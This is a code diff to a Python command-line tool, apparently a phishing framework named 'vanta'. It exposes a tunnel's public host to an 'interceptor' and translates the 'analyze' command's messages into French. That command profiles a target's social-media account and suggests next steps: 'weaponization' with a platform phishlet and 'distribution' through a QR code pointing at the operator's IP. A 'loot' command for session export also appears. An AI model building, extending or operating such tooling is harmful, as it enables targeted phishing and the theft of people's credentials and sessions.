@@ -309,6 +309,10 @@ def edge_run(name, path, host, port, tunnel, upstream, rate, allow_ips, deny_ips
             try:
                 public_url = asyncio.run(tm.start())
                 console.print(f"[green]Tunnel Actif:[/green] {public_url}")
+                os.environ["VANTA_PUBLIC_URL"] = public_url
+                # Also clean the URL to get just the hostname for the interceptor
+                if "://" in public_url:
+                    os.environ["VANTA_PUBLIC_HOST"] = public_url.split("://")[1].split("/")[0]
             except Exception as e:
                 console.print(f"[red]Tunnel Error: {e}[/red]")
         else:
@@ -544,19 +548,19 @@ def scan_file(file):
         console.print(f"[red]Error: {e}[/red]")
 
 @cli.command("analyze")
-@click.option("--target", required=True, help="Target handle (e.g., @user)")
-@click.option("--platform", required=True, help="Target platform (twitter, linkedin, etc.)")
-@click.option("--out", default="target_profile.json", help="Output JSON file")
+@click.option("--target", required=True, help="Cible à analyser (ex: @pseudo)")
+@click.option("--platform", required=True, help="Plateforme cible (ex: twitter, linkedin)")
+@click.option("--out", default="target_profile.json", help="Fichier JSON de sortie")
 def analyze(target, platform, out):
-    """Analyze a target profile for campaign personalization."""
-    console.print(f"[bold blue]Starting Reconnaissance on {target} ({platform})[/bold blue]")
+    """Analyse OSINT approfondie & Reconnaissance"""
+    console.print(f"[bold blue]Lancement de la reconnaissance sur {target} ({platform})[/bold blue]")
     try:
         recon = get_recon_module(platform, target)
         data = recon.analyze()
         
-        table = Table(title=f"Recon Results: {target}")
-        table.add_column("Field", style="cyan")
-        table.add_column("Value", style="green")
+        table = Table(title=f"Résultats Reconnaissance: {target}")
+        table.add_column("Champ", style="cyan")
+        table.add_column("Valeur", style="green")
         
         for k, v in data.items():
             table.add_row(k, str(v))
@@ -565,7 +569,7 @@ def analyze(target, platform, out):
         
         with open(out, "w") as f:
             json.dump(data, f, indent=2)
-        console.print(f"[bold green]✓ Data saved to {out}[/bold green]")
+        console.print(f"[bold green]✓ Données sauvegardées dans {out}[/bold green]")
         
         # Suggest next steps
         phishlet_path = f"phishlets/{platform.lower()}.yaml"
@@ -579,12 +583,12 @@ def analyze(target, platform, out):
             phishlet_path = f"phishlets/{aliases[platform.lower()]}"
         
         if os.path.exists(phishlet_path):
-            console.print(f"\n[bold yellow]Suggested Next Steps:[/bold yellow]")
-            console.print(f"1. [bold]Weaponization[/bold]: Configure phishlet\n   [green]vanta edge-run --path {phishlet_path}[/green]")
-            console.print(f"2. [bold]Distribution[/bold]: Generate QR Code\n   [green]vanta safe-qr --url http://<YOUR_IP>:8443 --logo core/assets/logos/{platform.lower()}.png[/green]")
+            console.print(f"\n[bold yellow]Prochaines étapes suggérées:[/bold yellow]")
+            console.print(f"1. [bold]Armement[/bold]: Configurer le phishlet\n   [green]vanta edge-run --path {phishlet_path}[/green]")
+            console.print(f"2. [bold]Distribution[/bold]: Générer QR Code\n   [green]vanta safe-qr --url http://<YOUR_IP>:8443 --logo core/assets/logos/{platform.lower()}.png[/green]")
             
     except Exception as e:
-        console.print(f"[bold red]Error: {e}[/bold red]")
+        console.print(f"[bold red]Erreur: {e}[/bold red]")
 
 @cli.command("loot")
 @click.option("--id", help="Session ID to export or view")
